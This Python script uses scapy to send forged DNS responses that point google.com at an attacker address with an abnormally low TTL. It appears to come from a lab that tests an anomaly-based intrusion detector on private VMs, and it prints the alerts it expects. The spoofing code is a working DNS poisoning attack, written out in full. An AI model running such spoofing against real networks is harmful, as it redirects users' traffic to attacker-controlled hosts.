#!/usr/bin/env python3
"""
DNS Spoofing Attack - Execute on Attacker VM
Generates DNS spoofing packets with low TTL that triggers anomaly detection
"""

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp
import random
import time
import sys

def main():
    print("\n" + "="*70)
    print("  DNS SPOOFING ATTACK - ANOMALY-BASED DETECTION TEST")
    print("="*70)
    
    # Network configuration
    interface = "eth0"              # Change to enp0s1 if needed
    attacker_ip = "192.168.128.101"
    victim_ip = "192.168.128.8"     # Changed to Monitor so it sees packets
    fake_ip = attacker_ip
    
    print(f"\n🎯 Attack Configuration:")
    print(f"   Interface:  {interface}")
    print(f"   Attacker:   {attacker_ip}")
    print(f"   Victim:     {victim_ip}")
    print(f"   Fake DNS:   google.com → {fake_ip}")
    print(f"\n⚡ Attack Parameters:")
    print(f"   TTL:        10 seconds (anomaly = low)")
    print(f"   Baseline:   3600 seconds (expected)")
    print(f"   Variance:   3590 seconds (> 600 threshold ✓)")
    print(f"   Duration:   10 seconds")
    print(f"   Packets:    50 spoofed DNS responses")
    
    print(f"\n🛡️  Detection Expected:")
    print(f"   Method:     ANOMALY_BASED (TTL variance detection)")
    print(f"   Confidence: 0.70-0.85")
    print(f"   Latency:    5-30 seconds")
    
    print("\n" + "-"*70)
    print("Starting attack in 3 seconds...")
    time.sleep(3)
    
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < 10:
            # Create DNS response with abnormally LOW TTL
            dns_pkt = IP(src=attacker_ip, dst=victim_ip) / \
                      UDP(sport=53, dport=random.randint(10000, 60000)) / \
                      DNS(id=random.randint(0, 65535),
                          qr=1,           # Response
                          rd=1, 
                          ra=1,
                          qd=DNSQR(qname="google.com"),
                          an=DNSRR(rrname="google.com",
                                  ttl=10,  # ⚠️ CRITICAL: TTL 10 triggers anomaly
                                  rdata=fake_ip))
            
            sendp(dns_pkt, iface=interface, verbose=False)
            packet_count += 1
            
            elapsed = time.time() - start_time
            if packet_count % 10 == 1:
                print(f"  [{elapsed:.1f}s] Sent {packet_count} spoofed DNS responses...")
            
            time.sleep(0.1)
        
        elapsed = time.time() - start_time
        
        print(f"\n{'='*70}")
        print(f"✅ ATTACK COMPLETE")
        print(f"{'='*70}")
        print(f"\n📊 Results:")
        print(f"   Duration:  {elapsed:.1f} seconds")
        print(f"   Packets:   {packet_count} DNS responses sent")
        print(f"   Target:    {victim_ip}")
        
        print(f"\n🔍 Expected Monitor Output (within 5-30 seconds):")
        print(f"   • PRODUCTION ALERT: DNS_SPOOFING")
        print(f"   • Source IP: {attacker_ip}")
        print(f"   • Confidence: ~0.75")
        print(f"   • Detection: ANOMALY_BASED")
        print(f"   • Reason: Abnormal TTL variance (10s vs 3600s baseline)")
        
        print(f"\n📋 To verify on Monitor VM:")
        print(f"   tail -f ~/securenet/production_security.log | grep -i dns")
        print(f"   tail -f ~/securenet/security_events.jsonl | jq '.attack_type'")
        
        print(f"\n{'='*70}\n")
        return 0
        
    except KeyboardInterrupt:
        print(f"\n\n⚠️  Attack interrupted")
        return 1
    except Exception as e:
        print(f"\n\n❌ Error: {e}")
        print(f"   Check:")
        print(f"   1. Interface name (try: ip link show)")
        print(f"   2. Sudo privileges (try: sudo python3 {sys.argv[0]})")
        print(f"   3. Scapy installed (try: pip3 install scapy)")
        print(f"   4. Network connectivity (try: ping 192.168.128.6)")
        return 1

if __name__ == "__main__":
    sys.exit(main())
